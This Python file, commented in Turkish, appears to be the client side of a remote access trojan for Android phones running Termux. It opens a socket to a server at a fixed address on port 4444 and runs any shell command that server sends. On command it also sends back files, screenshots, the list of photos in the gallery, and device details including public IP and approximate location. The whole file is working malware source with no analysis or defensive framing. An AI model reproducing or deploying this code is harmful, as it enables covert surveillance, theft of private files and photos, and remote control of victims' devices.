import socket
import os
import subprocess
import json

try:
    import requests
except ImportError:
    requests = None

HOST = '192.168.1.106'  # Sunucu IP
PORT = 4444

client = socket.socket()
client.connect((HOST, PORT))

def send_file(client, filename):
    try:
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                client.send(bytes_read)
        client.send(b"__END__")
    except FileNotFoundError:
        client.send("Hata: Dosya bulunamadı.".encode())

def receive_file(client, filename):
    with open(filename, "wb") as f:
        while True:
            data = client.recv(1024)
            if data.endswith(b"__END__"):
                f.write(data[:-7])
                break
            f.write(data)

def get_battery_level():
    try:
        output = subprocess.check_output(["termux-battery-status"]).decode()
        data = json.loads(output)
        return str(data.get("percentage", "Bilinmiyor"))
    except Exception:
        return "Bilinmiyor"

def get_android_version():
    try:
        version = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
        return version
    except Exception:
        return "Bilinmiyor"

def get_model():
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        return model
    except Exception:
        return "Bilinmiyor"

def get_public_ip():
    if not requests:
        return "requests modülü yüklü değil"
    try:
        return requests.get("https://api.ipify.org").text
    except Exception as e:
        return f"IP alınamadı: {e}"

def get_location_ip_based():
    if not requests:
        return "requests modülü yüklü değil"
    try:
        ip_info = requests.get("https://ipinfo.io/json").json()
        loc = ip_info.get("loc", "Bilinmiyor")
        city = ip_info.get("city", "")
        region = ip_info.get("region", "")
        country = ip_info.get("country", "")
        return f"{loc} ({city}, {region}, {country})"
    except Exception as e:
        return f"Konum alınamadı: {e}"

def has_camera():
    try:
        output = subprocess.check_output(["getprop", "ro.hardware"]).decode()
        return "Evet" if "camera" in output.lower() else "Bilinmiyor"
    except Exception:
        return "Bilinmiyor"

def list_gallery():
    paths = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures"
    ]
    files = []
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                files.append(f"{path}/{file}")
    return files

current_dir = "/"  # Başlangıç dizini

while True:
    try:
        cmd = client.recv(1024).decode().strip()
        if cmd == "exit":
            break

        elif cmd.startswith("cd "):
            new_path = cmd[3:].strip()
            if not new_path.startswith("/"):
                new_path = os.path.join(current_dir, new_path)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                current_dir = os.path.abspath(new_path)
                client.send(f"Dizin değiştirildi: {current_dir}".encode())
            else:
                client.send(f"Hata: '{new_path}' geçerli bir dizin değil.".encode())

        elif cmd.startswith("download "):
            filename = cmd[len("download "):].strip()
            if not filename.startswith("/"):
                filename = os.path.join(current_dir, filename)
            send_file(client, filename)

        elif cmd == "screenshot":
            try:
                os.system("screencap -p /sdcard/screenshot.png")
                with open("/sdcard/screenshot.png", "rb") as f:
                    while True:
                        bytes_read = f.read(1024)
                        if not bytes_read:
                            break
                        client.send(bytes_read)
                client.send(b"__END__")
            except Exception as e:
                client.send(f"Hata: {e}".encode())

        elif cmd == "pwd":
            client.send(current_dir.encode())

        elif cmd.startswith("ls"):
            try:
                output = subprocess.check_output(cmd, cwd=current_dir, shell=True, stderr=subprocess.STDOUT)
                client.send(output)
            except subprocess.CalledProcessError as e:
                client.send(e.output)

        elif cmd == "gallery":
            try:
                files = list_gallery()
                response = "\n".join(files) if files else "Galeri klasörleri boş veya bulunamadı."
                client.send(response.encode())
            except Exception as e:
                client.send(f"Hata: {e}".encode())

        elif cmd == "info":
            battery = get_battery_level()
            android_version = get_android_version()
            model = get_model()
            public_ip = get_public_ip()
            location = get_location_ip_based()
            camera = has_camera()
            response = f"""
📱 Cihaz Bilgileri:
Model: {model}
Android Versiyonu: {android_version}
Şarj Seviyesi: %{battery}
Public IP: {public_ip}
Yaklaşık Konum (IP): {location}
Kamera Var mı?: {camera}
"""
            client.send(response.encode())

        elif cmd.startswith("yaz "):
            # Server'dan gelen mesajı terminale yazdır
            message = cmd[4:].strip()
            print(f"\n[Server Mesajı]: {message}")

        else:
            try:
                result = subprocess.check_output(cmd, cwd=current_dir, shell=True, stderr=subprocess.STDOUT)
                client.send(result)
            except subprocess.CalledProcessError as e:
                client.send(e.output)

    except Exception as e:
        client.send(f"Genel Hata: {e}".encode())

client.close()